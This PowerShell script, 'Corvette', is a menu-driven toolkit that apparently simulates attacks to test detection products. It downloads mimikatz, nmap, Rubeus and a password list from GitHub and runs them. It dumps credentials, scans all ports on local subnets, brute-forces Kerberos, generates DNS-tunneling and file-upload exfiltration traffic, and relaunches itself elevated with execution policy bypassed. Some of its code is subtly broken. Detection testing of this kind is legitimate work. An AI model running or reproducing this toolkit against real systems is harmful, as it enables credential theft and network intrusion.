
Set-Variable -Scope script -Name PATTERN_IPV4_ADDR -Option Constant -Value "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"

function IsFile ([string]$path) {
    return [IO.File]::Exists($path)
}

function IsDirectory ([string]$path) {
    return ![string]::IsNullOrEmpty($save_as) -And (Test-Path $path) -And ((Get-Item $path) -is [IO.DirectoryInfo])
}

function BuildFullPath ([string]$parent, [string]$child) {
    return [IO.Path]::GetFullPath((Join-Path $parent $child))
}

function ReadAllBytes ([IO.BinaryReader] $reader) {
    $mem = New-Object IO.MemoryStream
    $buf = New-Object byte[] 4096
    $actual = 0
    do {
        $actual = $reader.Read($buf, 0, $buf.Length)
        If ($actual -gt 0) {
            $mem.Write($buf, 0, $actual)
        }
    } While ($actual -ne 0)

    $mem.Close()
    return $mem.ToArray()
}

function DownloadString ([string]$url) {
    return [Net.WebClient]::New().DownloadString($url)
}

function DownloadBytes ([string]$url) {
    $resp = New-Object IO.BinaryReader([Net.HttpWebRequest]::Create($url).GetResponse().GetResponseStream())
    return ReadAllBytes($resp)
}

function DownloadFile ([string]$url, [string]$save_as) {
    $cli = New-Object Net.WebClient
    if ([string]::IsNullOrEmpty($save_as) -Or (IsDirectory $save_as)) {
        $uri = New-Object System.Uri($url)
        if (!$uri.AbsolutePath.EndsWith("/")) {
            $filename = Split-Path $uri.AbsolutePath -Leaf
        } else {
            $filename = "temp.dat"
        }
        if ((IsDirectory $save_as)) {
            $save_as = [IO.Path]::GetFullPath((Join-Path $save_as $filename))
        } else {
            $save_as = $filename
        }
    }
    $cli.DownloadFile($url, $save_as)
    return $save_as
}

function DownloadAndExtractArchive ([string]$url, [string]$directory) {
    $file = DownloadFile $url ([IO.Path]::GetTempPath())
    Expand-Archive -Force $file $directory
    Remove-Item $file
}

function ReadInput([string]$message, [string]$default, [string]$pattern, [string]$retry_message) {
    if (![string]::IsNullOrEmpty($default)) {
        $message += " (default: $default)"
    }
    do {
        $input = (Read-Host $message).Trim()
        if ([string]::IsNullOrEmpty($input) -And ![string]::IsNullOrEmpty($default)) {
            return $default
        }
        if ([string]::IsNullOrEmpty($pattern) -Or ($input -match $pattern)) {
            return $input
        }
        if (![string]::IsNullOrEmpty($input) -And ![string]::IsNullOrEmpty($retry_message)) {
            Write-Host $retry_message
        }
    } while ($true)
}

function ReadInputSize([string]$message, [string]$default, [string]$retry_message) {

    $pattern = "^(?<num>\d+(?:\.\d+)?)\s*(?<unit>[KMGT]?B)?$"
    $size_unit = $null
    do {
        $size = ReadInput $message $default $pattern $retry_message
        if ($size -match $pattern) {
            if ($matches.unit -eq $null){
                return $size
            }
            $size_unit = @{
                ""=1
                "B"=1
                "KB"=[Math]::pow(2, 10)
                "MB"=[Math]::pow(2, 20)
                "GB"=[Math]::pow(2, 30)
                "TB"=[Math]::pow(2, 40)
            }[$matches.unit]
            if ($size_unit) {
                return ((ParseNumber $matches.num) * $size_unit)
            }
        }
        Write-Host $retry_message
    } while ($true)
}

function AskYesNo([string]$message) {
    do {
        $answer = Read-Host "$message [Y/n]"
        $answer = $answer.ToLower()
        if ($answer -eq "yes" -Or $answer -eq "y") {
            return $true
        } elseif ($answer -eq "no" -Or $answer -eq "n") {
            return $false
        }
    } while ($true)
    return $false
}

function Quote($value) {
    if ($value -is [array]) {
        return $value | % { (Quote $_) }
    } else {
        $value = $value.Replace('"', '""')
        return "`"$value`""
    }
}

function ParseNumber([string]$val) {
    $num = 0
    if ([int]::TryParse($val, [ref]$num)) { 
        return $num
    } else {
        return $null
    }
}

class Properties {
    [string]$my_script
    [string]$home_dir
    [System.Management.Automation.InvocationInfo]$invocation_info

    Properties([System.Management.Automation.InvocationInfo]$info) {
        $this.invocation_info = $info
        $this.home_dir = BuildFullPath ([IO.Path]::GetTempPath()) ".\corvette"

        if ([string]::IsNullOrEmpty($info.MyCommand.Path)) {
            $this.my_script = $info.MyCommand
        } else {
            $this.my_script = [System.IO.File]::ReadAllText($info.MyCommand.Path)
        }
    }

    hidden [void]Initialize() {
        New-Item -ItemType Directory -Force -Path $this.home_dir
    }

    [string]MakeSureScriptFileExists() {
        $path = $myInvocation.MyCommand.Path
        if ([string]::IsNullOrEmpty($path)) {
            $path = BuildFullPath $this.home_dir ".\corvette.ps1"
            $utf8n = New-Object System.Text.UTF8Encoding($false)
            [System.IO.File]::WriteAllText($path, $this.my_script, $utf8n)
        }
        return $path
    }
}

class CommandBase {
    [Properties]$props

    CommandBase([Properties]$props) {
        $this.props = $props
    }
}

class Mimikatz : CommandBase {
    [string]$mimikatz_dir
    [string]$mimikatz_exe

    Mimikatz([Properties]$props) : base($props) {
        $this.mimikatz_dir = BuildFullPath $props.home_dir ".\mimikatz"
        $this.mimikatz_exe = BuildFullPath $this.mimikatz_dir "mimikatz.exe"

        if (!(IsFile $this.mimikatz_exe)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/mimikatz.zip?raw=true"
            DownloadAndExtractArchive $url $this.mimikatz_dir
        }
    }

    [void]Run([bool]$run_as) {
        if ($run_as) {
            Start-Process -FilePath $this.mimikatz_exe -WorkingDirectory $this.props.home_dir -verb runas
        } else {
            Start-Process -FilePath $this.mimikatz_exe -WorkingDirectory $this.props.home_dir
        }
    }
}

class PortScan : CommandBase {
    [string]$nmap_dir
    [string]$nmap_exe

    PortScan([Properties]$props) : base($props) {
        $this.nmap_dir = BuildFullPath $props.home_dir ".\nmap"
        $this.nmap_exe = BuildFullPath $this.nmap_dir "nmap.exe"

        if (!(IsFile $this.nmap_exe)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/nmap-7.92.zip?raw=true"
            DownloadAndExtractArchive $url $this.nmap_dir
        }
    }

    [void]Run() {
        [array]$subnet_list = Get-NetIPAddress -AddressFamily IPV4 -SuffixOrigin @("Dhcp", "Manual") `
                            | select IPAddress, PrefixLength `
                            | % { $_.IPAddress + '/' + $_.PrefixLength }
        foreach ($subnet in $subnet_list) {
            Write-Host ""
            Write-Host "Starting a port scan: $subnet"

            $cargs = @($this.nmap_exe, "-p", "1-65535", $subnet)
            $args = @("/C,") + (Quote $cargs) + "& echo Done. & pause"
            Start-Process -FilePath "cmd.exe" -ArgumentList $args -WorkingDirectory $this.props.home_dir
        }
    }
}

class KerberosBruteForce : CommandBase {
    [string]$rubeus_dir
    [string]$rubeus_exe
    [string]$passwords_file

    KerberosBruteForce([Properties]$props) : base($props) {
        $this.rubeus_dir = BuildFullPath $props.home_dir ".\rubeus"
        $this.rubeus_exe = BuildFullPath $this.rubeus_dir "rubeus.exe"
        $this.passwords_file = BuildFullPath $this.rubeus_dir "passwords.txt"

        if (!(IsFile $this.rubeus_exe)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/rubeus.zip?raw=true"
            DownloadAndExtractArchive $url $this.rubeus_dir
        }
        if (!(IsFile $this.passwords_file)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/passwords.zip?raw=true"
            DownloadAndExtractArchive $url $this.rubeus_dir
        }
    }

    [void]Run() {
        $cargs = @($this.rubeus_exe, "brute", "/passwords:$($this.passwords_file)", "/noticket")
        $args = @("/C,") + (Quote $cargs) + "& echo Done. & pause"
        Start-Process -FilePath "cmd.exe" -ArgumentList $args -WorkingDirectory $this.props.home_dir
    }
}

class WildFireTestPE : CommandBase {
    [string]$wildfire_dir
    [string]$wildfire_exe

    WildFireTestPE([Properties]$props) : base($props) {
        $this.props = $props
        $this.wildfire_dir = BuildFullPath $props.home_dir ".\wildfire"
        $this.wildfire_exe = BuildFullPath $this.wildfire_dir "wildfire-test-pe-file.exe"

        if (!(IsFile $this.wildfire_exe)) {
            New-Item -ItemType Directory -Force -Path $this.wildfire_dir

            $url = "https://wildfire.paloaltonetworks.com/publicapi/test/pe"
            DownloadFile $url $this.wildfire_exe
        }
    }

    [void]Run() {
        $args = @("/C,", (Quote $this.wildfire_exe), "& echo Done. & pause")
        Start-Process -FilePath "cmd.exe" -ArgumentList $args -WorkingDirectory $this.props.home_dir
    }
}

class IptgenBase : CommandBase {
    [string]$iptgen_dir
    [string]$iptgen_exe

    IptgenBase([Properties]$props) : base($props) {
        $this.iptgen_dir = BuildFullPath $props.home_dir ".\iptgen"
        $this.iptgen_exe = BuildFullPath $this.iptgen_dir ".\bin\iptgen.exe"

        if (!(IsFile $this.iptgen_exe)) {
            $url = "https://github.com/spearmin10/iptgen/releases/download/0.8.0/iptgen.win32.zip"
            DownloadAndExtractArchive $url $this.iptgen_dir
        }
        if (!(IsFile $env:WINDIR\system32\Npcap\wpcap.dll)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/npcap-1.72.exe?raw=true"
            $path = DownloadFile $url "npcap-1.72.exe"
            Start-Process -FilePath $path -Wait
        }
    }

    [Microsoft.Management.Infrastructure.CimInstance]SelectInterface() {
        [array]$interfaces = Get-NetIPAddress -AddressFamily IPV4 -SuffixOrigin @("Dhcp", "Manual") `
                           | Sort-Object -Property InterfaceAlias
        if ($interfaces.Length -eq 0) {
            Write-Host "No network interfaces were found."
            return $null
        } elseif ($interfaces.Length -eq 1) {
            return $interfaces[0]
        }
        Write-Host ""
        Write-Host "************************************"
        for ($i = 0; $i -lt $interfaces.Length; $i++) {
            Write-Host " $($i+1)) $($interfaces[$i].InterfaceAlias)"
        }
        Write-Host " 0) [Exit Menu]"

        for ($num = -1 ; $num -ne 0 ;){
            $num = ParseNumber (ReadInput "Select an interface to replay packets")
            if ($num -gt 0 -And $num -le $interfaces.Length) { 
                return $interfaces[$num - 1]
            }
        }
        return $null
    }

    [void]Run([string]$interface, [string]$iptgen_json, [int]$response_interval) {
        if ($response_interval -eq 0) {
            $cargs = @($this.iptgen_exe, "--in.file", $iptgen_json, "--out.eth", $interface)
        } else {
            $cargs = @($this.iptgen_exe, "--in.file", $iptgen_json, "--out.eth", $interface, "--response.interval", $response_interval)
        }
        $cargs = @($this.iptgen_exe, "--in.file", $iptgen_json, "--out.eth", $interface, "--response.interval", "10")
        $args = @("/C,") + (Quote $cargs) + "& echo Done. & pause"
        Start-Process -FilePath "cmd.exe" -ArgumentList $args -WorkingDirectory $this.props.home_dir
    }
}

class DnsTunneling : IptgenBase {
    [string]$iptgen_json

    DnsTunneling([Properties]$props) : base ($props) {
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\dns-tunneling-template.json"
        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/dns-tunneling-template.json"
            DownloadFile $url $this.iptgen_json
        }
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the DNS tunneling configuration"
        $client_ip = ReadInput "DNS client IP" `
                               $interface.IPAddress `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "DNS server IP" `
                               "" `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $domain = ReadInput "DNS tunnel domain" $null ".+"

        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        $Env:domain = $domain
        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($interface.InterfaceAlias, $this.iptgen_json, 10)
        }
    }
}

class FtpFileUpload : IptgenBase {
    [string]$iptgen_json

    FtpFileUpload([Properties]$props) : base ($props) {
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\ftp-upload-passive-template.json"
        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/ftp-upload-passive-template.json"
            DownloadFile $url $this.iptgen_json
        }
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the FTP file upload configuration"
        $client_ip = ReadInput "Client IP" `
                               $interface.IPAddress `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "Server IP" `
                               "" `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $upload_filename = ReadInput "Upload file name" "test.dat" ".+"
        $upload_filesize = ReadInputSize "Upload file size" "100MB" "Invalid file size. Please retype the size."

        $pasv_port = 34567
        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        $Env:upload_filename = $upload_filename
        $Env:upload_filesize = $upload_filesize
        $Env:pasv_port = $pasv_port
        $Env:pasv_address = $server_ip.Replace('.', ',') + "," + [string][int][Math]::Floor($pasv_port / 256) + "," + [string]($pasv_port % 256)            

        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($interface.InterfaceAlias, $this.iptgen_json, 10)
        }
    }
}

class HttpFileUpload : IptgenBase {
    [string]$iptgen_json
    [bool]$https

    HttpFileUpload([Properties]$props, [bool]$https) : base ($props) {
        $file_name = $null
        
        if ($https) {
          $file_name = "https-upload-template.json"
        } else {
          $file_name = "http-upload-template.json"
        }
        $this.$https = $https
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\$($file_name)"

        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.iptgen_json
        }
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the HTTP file upload configuration"
        $client_ip = ReadInput "Client IP" `
                               $interface.IPAddress `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "Server IP" `
                               "" `
                               $script:PATTERN_IPV4_ADDR `
                               "Please retype a valid IPv4 address"
        $upload_filesize = ReadInputSize "Upload file size" "100MB" "Invalid file size. Please retype the size."

        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        $Env:upload_filesize = $upload_filesize

        if (AskYesNo "Are you sure you want to run?") {
            $response_interval = 10
            if ($this.$https) {
                $response_interval = 0
            }
            $this.Run($interface.InterfaceAlias, $this.iptgen_json, $response_interval)
        }
    }
}

class Menu {
    [Properties]$props
    
    Menu([Properties]$props) {
        $this.props = $props
    }

    hidden [bool]LaunchUserModeCommand($cmd) {
        switch ($cmd) {
            "0" {
                <#
                $script = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($this.props.my_script))
                $args = Quote @("-e", $script)
                Start-Process -FilePath "powershell.exe" -verb runas -ArgumentList $args
                #>
                $path = $this.props.MakeSureScriptFileExists()
                $args = Quote @("-ExecutionPolicy", "Bypass", $path)
                Start-Process -FilePath "powershell.exe" -verb runas -ArgumentList $args
            }
            "1" {
                Start-Process -FilePath "cmd.exe" -WorkingDirectory $this.props.home_dir
            }
            "2" {
                Start-Process -FilePath "powershell.exe" -WorkingDirectory $this.props.home_dir
            }
            "3" {
                $cargs = @("/d", $this.props.home_dir)
                $args = @("/K,", "cd") + (Quote $cargs)
                Start-Process -FilePath "cmd.exe" -verb runas -ArgumentList $args
            }
            "4" {
                $script = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("cd " + (Quote $this.props.home_dir)))
                $args = @("-NoExit", "-e", $script)
                Start-Process -FilePath "powershell.exe" -verb runas -ArgumentList $args
            }
            "5" {
                [Mimikatz]::New($this.props).Run($false)
            }
            "6" {
                [Mimikatz]::New($this.props).Run($true)
            }
            "7" {
                [PortScan]::New($this.props).Run()
            }
            "8" {
                [KerberosBruteForce]::New($this.props).Run()
            }
            "9" {
                [WildFireTestPE]::New($this.props).Run()
            }
            default {
                return $false
            }
        }
        return $true
    }

    hidden [void]OpenUserModeMenu() {
        Write-Host "Corvette"
        while ($true) {
            Write-Host "************************************"
            Write-Host " 0) Run as administrator"
            Write-Host " 1) Create a new command shell"
            Write-Host " 2) Create a new powershell"
            Write-Host " 3) Create a new command shell (Run as administrator)"
            Write-Host " 4) Create a new powershell (Run as administrator)"
            Write-Host " 5) Run mimikatz"
            Write-Host " 6) Run mimikatz (Run as administrator)"
            Write-Host " 7) Run port scan"
            Write-Host " 8) Run Kerberos Brute Force"
            Write-Host " 9) Run WildFire Test PE"
            try {
                while (!$this.LaunchUserModeCommand((Read-Host "Please choose a menu item to run"))) {}
            } catch {
                Write-Host $_
            }
        }
    }

    hidden [bool]LaunchAdminModeCommand($cmd) {
        switch ($cmd) {
            "1" {
                Start-Process -FilePath "cmd.exe" -WorkingDirectory $this.props.home_dir
            }
            "2" {
                Start-Process -FilePath "powershell.exe" -WorkingDirectory $this.props.home_dir
            }
            "3" {
                [Mimikatz]::New($this.props).Run($false)
            }
            "4" {
                [PortScan]::New($this.props).Run()
            }
            "5" {
                [KerberosBruteForce]::New($this.props).Run()
            }
            "6" {
                [WildFireTestPE]::New($this.props).Run()
            }
            "7" {
                [DnsTunneling]::New($this.props).Run()
            }
            "8" {
                [FtpFileUpload]::New($this.props).Run()
            }
            "9" {
                [HttpFileUpload]::New($this.props, $false).Run()
            }
            "10" {
                [HttpFileUpload]::New($this.props, $true).Run()
            }
            default {
                return $false
            }
        }
        return $true
    }

    hidden [void]OpenAdminModeMenu() {
        Write-Host "Corvette"
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) Create a new command shell"
            Write-Host " 2) Create a new powershell"
            Write-Host " 3) Run mimikatz"
            Write-Host " 4) Run port scan"
            Write-Host " 5) Run Kerberos Brute Force"
            Write-Host " 6) Run WildFire Test PE"
            Write-Host " 7) Generate DNS tunneling packets"
            Write-Host " 8) Generate FTP file upload packets"
            Write-Host " 9) Generate HTTP file upload packets"
            Write-Host "10) Generate HTTPS file upload packets"
            try {
                while (!$this.LaunchAdminModeCommand((Read-Host "Please choose a menu item to run"))) {}
            } catch {
                Write-Host $_
            }
        }
    }

    [void]OpenMenu() {
        $current = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        if ($current.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            $this.OpenAdminModeMenu()
        } else {
            $this.OpenUserModeMenu()
        }
    }
}

$props = [Properties]::New($MyInvocation)
$props.Initialize()

[Menu]::New($props).OpenMenu()
